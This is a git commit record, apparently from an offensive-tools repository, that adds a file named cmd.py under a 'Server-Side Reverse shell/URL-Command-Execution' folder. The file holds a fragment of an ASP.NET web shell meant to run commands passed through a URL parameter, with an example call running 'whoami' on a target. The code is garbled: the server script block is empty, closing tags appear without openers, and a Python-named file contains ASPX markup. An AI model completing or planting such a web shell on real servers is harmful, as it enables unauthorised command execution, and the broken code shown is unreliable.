09a63a961260fbfdd5efaf797aa8eef21e63bcaa
AnubisXploit <mohamedgamal202@icloud.com>
2024-11-23 14:32:49 +0200

    Create cmd.py

---
+++ Server-Side Reverse shell/URL-Command-Execution/cmd.py
@@ -0,0 +1,10 @@
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script runat="server">
+    
+    <h1>Command Execution</h1>
+</body>
+</html>
+
+# Example Usage:http://<target>/cmd.aspx?cmd=whoami
